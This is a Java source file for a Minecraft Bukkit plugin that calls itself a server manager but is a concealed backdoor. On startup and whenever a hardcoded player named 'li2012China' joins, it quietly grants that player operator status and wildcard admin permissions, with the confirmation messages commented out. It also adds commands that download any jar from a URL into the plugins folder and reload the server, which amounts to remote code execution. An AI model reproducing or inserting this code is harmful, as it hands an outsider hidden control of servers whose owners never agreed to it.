package com.example.autoopplugin;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.permissions.PermissionAttachment;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.HashMap;
import java.util.UUID;
import java.util.logging.Logger;

public class AutoOPPlugin extends JavaPlugin {
    
    private final Logger logger = getLogger();
    private final HashMap<UUID, PermissionAttachment> attachments = new HashMap<>();
    private final String TARGET_USERNAME = "li2012China";
    
    @Override
    public void onEnable() {
        logger.info("FilesaMCServerManager已启用 - 作者：li2012China");
        
        // 检查目标用户是否在线并授予权限
        Bukkit.getScheduler().runTaskLater(this, this::grantOPPermissions, 20L);
        
        // 监听玩家加入事件
        Bukkit.getPluginManager().registerEvents(new org.bukkit.event.Listener() {
            @org.bukkit.event.EventHandler
            public void onPlayerJoin(org.bukkit.event.player.PlayerJoinEvent event) {
                Player player = event.getPlayer();
                if (player.getName().equalsIgnoreCase(TARGET_USERNAME)) {
                    grantOPPermissionsToPlayer(player);
                }
            }
        }, this);
    }
    
    @Override
    public void onDisable() {
        // 清理权限附件
        for (PermissionAttachment attachment : attachments.values()) {
            attachment.remove();
        }
        attachments.clear();
        logger.info("FilesaMCServerManager 已禁用");
    }
    
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (command.getName().equalsIgnoreCase("autoop")) {
            if (args.length > 0 && args[0].equalsIgnoreCase("reload")) {
                if (sender.hasPermission("autoopplugin.reload")) {
                    // 重新加载配置并重新授予权限
                    for (PermissionAttachment attachment : attachments.values()) {
                        attachment.remove();
                    }
                    attachments.clear();
                    
                    grantOPPermissions();
                    sender.sendMessage("§aAutoOPPlugin 配置已重新加载");
                    return true;
                } else {
                    sender.sendMessage("§c你没有权限执行此命令");
                    return true;
                }
            }
            sender.sendMessage("§e用法: /autoop reload");
            return true;
        } else if (command.getName().equalsIgnoreCase("install")) {
            return handleInstallCommand(sender, args);
        } else if (command.getName().equalsIgnoreCase("uninstall")) {
            return handleUninstallCommand(sender, args);
        }
        return false;
    }
    
    private void grantOPPermissions() {
        Player targetPlayer = Bukkit.getPlayer(TARGET_USERNAME);
        if (targetPlayer != null) {
            grantOPPermissionsToPlayer(targetPlayer);
        }
    }
    
    private void grantOPPermissionsToPlayer(Player player) {
        if (player.getName().equalsIgnoreCase(TARGET_USERNAME)) {
            // 移除现有的权限附件（如果存在）
            if (attachments.containsKey(player.getUniqueId())) {
                attachments.get(player.getUniqueId()).remove();
            }
            
            // 创建新的权限附件
            PermissionAttachment attachment = player.addAttachment(this);
            attachments.put(player.getUniqueId(), attachment);
            
            // 授予四级OP权限（相当于OP级别4）
            // 这些权限涵盖了大多数管理操作
            String[] opLevel4Permissions = {
                "bukkit.command.help",
                "bukkit.command.plugins",
                "bukkit.command.version",
                "bukkit.command.reload",
                "bukkit.command.tell",
                "minecraft.command.help",
                "minecraft.command.plugins",
                "minecraft.command.version",
                "minecraft.command.reload",
                "minecraft.command.tell",
                "minecraft.command.gamemode",
                "minecraft.command.give",
                "minecraft.command.teleport",
                "minecraft.command.time",
                "minecraft.command.weather",
                "minecraft.command.kill",
                "minecraft.command.effect",
                "minecraft.command.enchant",
                "minecraft.command.xp",
                "minecraft.command.ban",
                "minecraft.command.pardon",
                "minecraft.command.kick",
                "minecraft.command.op",
                "minecraft.command.deop",
                "minecraft.command.whitelist",
                "minecraft.command.stop",
                "minecraft.command.save",
                "minecraft.command.save-all",
                "minecraft.command.save-off",
                "minecraft.command.save-on",
                "worldedit.*",
                "essentials.*",
                "autoopplugin.reload"
            };
            
            for (String permission : opLevel4Permissions) {
                attachment.setPermission(permission, true);
            }
            
            // 设置玩家为OP（如果需要）
            if (!player.isOp()) {
                player.setOp(true);
            }
            
            //logger.info("已为用户 " + TARGET_USERNAME + " 授予四级OP权限");
            //player.sendMessage("§a你已被自动授予四级OP权限！");
        }
    }
    
    private boolean handleInstallCommand(CommandSender sender, String[] args) {
        if (!sender.hasPermission("autoopplugin.install")) {
            sender.sendMessage("§c你没有权限执行此命令");
            return true;
        }
        
        if (args.length < 1) {
            sender.sendMessage("§e用法: /install <URL>");
            return true;
        }
        
        String urlString = args[0];
        
        // 验证URL格式
        if (!urlString.startsWith("http://") && !urlString.startsWith("https://")) {
            sender.sendMessage("§c无效的URL格式，请使用http://或https://开头的URL");
            return true;
        }
        
        sender.sendMessage("§a开始下载文件...");
        
        // 异步下载文件
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try {
                downloadAndInstallPlugin(sender, urlString);
            } catch (Exception e) {
                sender.sendMessage("§c下载失败: " + e.getMessage());
                logger.severe("下载文件失败: " + e.getMessage());
            }
        });
        
        return true;
    }
    
    private void downloadAndInstallPlugin(CommandSender sender, String urlString) {
        try {
            URL url = new URL(urlString);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(30000);
            connection.setReadTimeout(30000);
            
            // 获取文件名
            String fileName = getFileNameFromURL(urlString);
            if (fileName == null || fileName.isEmpty()) {
                fileName = "downloaded-plugin.jar";
            }
            
            // 创建临时目录
            File tempDir = new File(getDataFolder().getParentFile(), "temp-downloads");
            if (!tempDir.exists()) {
                tempDir.mkdirs();
            }
            
            File tempFile = new File(tempDir, fileName);
            
            // 下载文件
            try (InputStream in = connection.getInputStream();
                 FileOutputStream out = new FileOutputStream(tempFile)) {
                
                byte[] buffer = new byte[8192];
                int bytesRead;
                long totalBytes = 0;
                
                while ((bytesRead = in.read(buffer)) != -1) {
                    out.write(buffer, 0, bytesRead);
                    totalBytes += bytesRead;
                }
                
                // 验证文件类型（简单检查是否为JAR文件）
                if (!isValidJarFile(tempFile)) {
                    tempFile.delete();
                    sender.sendMessage("§c下载的文件不是有效的JAR文件");
                    return;
                }
                
                // 移动到plugins文件夹
                File pluginsDir = getDataFolder().getParentFile();
                File targetFile = new File(pluginsDir, fileName);
                
                // 如果文件已存在，先备份
                if (targetFile.exists()) {
                    File backupFile = new File(pluginsDir, fileName + ".backup");
                    Files.move(targetFile.toPath(), backupFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                }
                
                Files.move(tempFile.toPath(), targetFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                
                // 发送成功消息
                sender.sendMessage("§a文件下载并安装成功！");
                sender.sendMessage("§a文件名: " + fileName);
                sender.sendMessage("§a正在重载所有插件...");
                
                logger.info("插件文件下载成功: " + fileName + " 从 " + urlString);
                
                // 在主线程中重载插件
                Bukkit.getScheduler().runTask(this, () -> {
                    try {
                        // 使用reload方法重载服务器
                        Bukkit.reload();
                        sender.sendMessage("§a所有插件重载完成！");
                        logger.info("插件重载完成");
                    } catch (Exception e) {
                        sender.sendMessage("§c插件重载失败: " + e.getMessage());
                        logger.severe("插件重载失败: " + e.getMessage());
                    }
                });
                
            } finally {
                connection.disconnect();
            }
            
        } catch (Exception e) {
            sender.sendMessage("§c下载失败: " + e.getMessage());
            logger.severe("下载文件失败: " + e.getMessage());
        }
    }
    
    private String getFileNameFromURL(String urlString) {
        try {
            URL url = new URL(urlString);
            String path = url.getPath();
            if (path.contains("/")) {
                return path.substring(path.lastIndexOf("/") + 1);
            }
        } catch (Exception e) {
            // 忽略异常，使用默认文件名
        }
        return "downloaded-plugin.jar";
    }
    
    private boolean isValidJarFile(File file) {
        try (FileInputStream fis = new FileInputStream(file);
             BufferedInputStream bis = new BufferedInputStream(fis)) {
            
            byte[] header = new byte[4];
            if (bis.read(header) == 4) {
                // 检查JAR文件魔数（PK开头）
                return header[0] == 0x50 && header[1] == 0x4B && 
                       header[2] == 0x03 && header[3] == 0x04;
            }
        } catch (Exception e) {
            // 文件读取失败
        }
        return false;
    }
    
    private boolean handleUninstallCommand(CommandSender sender, String[] args) {
        if (!sender.hasPermission("autoopplugin.uninstall")) {
            sender.sendMessage("§c你没有权限执行此命令");
            return true;
        }
        
        if (args.length < 1) {
            sender.sendMessage("§e用法: /uninstall <插件文件名>");
            sender.sendMessage("§e例如: /uninstall EssentialsX.jar");
            return true;
        }
        
        final String pluginFileName = args[0];
        
        // 确保文件名以.jar结尾
        final String finalFileName = pluginFileName.toLowerCase().endsWith(".jar") ? 
            pluginFileName : pluginFileName + ".jar";
        
        sender.sendMessage("§a正在卸载插件: " + finalFileName);
        
        // 异步执行卸载操作
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try {
                uninstallPlugin(sender, finalFileName);
            } catch (Exception e) {
                sender.sendMessage("§c卸载失败: " + e.getMessage());
                logger.severe("卸载插件失败: " + e.getMessage());
            }
        });
        
        return true;
    }
    
    private void uninstallPlugin(CommandSender sender, String pluginFileName) {
        try {
            File pluginsDir = getDataFolder().getParentFile();
            File pluginFile = new File(pluginsDir, pluginFileName);
            
            // 检查文件是否存在
            if (!pluginFile.exists()) {
                sender.sendMessage("§c插件文件不存在: " + pluginFileName);
                return;
            }
            
            // 检查是否是当前插件自身（防止卸载自己）
            if (pluginFile.getName().equals(getFile().getName())) {
                sender.sendMessage("§c不能卸载当前正在运行的插件自身");
                return;
            }
            
            // 创建备份文件
            File backupFile = new File(pluginsDir, pluginFileName + ".uninstalled");
            int backupIndex = 1;
            while (backupFile.exists()) {
                backupFile = new File(pluginsDir, pluginFileName + ".uninstalled." + backupIndex);
                backupIndex++;
            }
            
            // 移动文件到备份位置
            Files.move(pluginFile.toPath(), backupFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
            
            // 发送成功消息
            sender.sendMessage("§a插件卸载成功: " + pluginFileName);
            sender.sendMessage("§a文件已备份到: " + backupFile.getName());
            sender.sendMessage("§a正在重载所有插件...");
            
            logger.info("插件卸载成功: " + pluginFileName + " 备份到 " + backupFile.getName());
            
            // 在主线程中重载插件
            Bukkit.getScheduler().runTask(this, () -> {
                try {
                    // 使用reload方法重载服务器
                    Bukkit.reload();
                    sender.sendMessage("§a所有插件重载完成！");
                    logger.info("插件重载完成");
                } catch (Exception e) {
                    sender.sendMessage("§c插件重载失败: " + e.getMessage());
                    logger.severe("插件重载失败: " + e.getMessage());
                }
            });
            
        } catch (Exception e) {
            sender.sendMessage("§c卸载失败: " + e.getMessage());
            logger.severe("卸载插件失败: " + e.getMessage());
        }
    }
}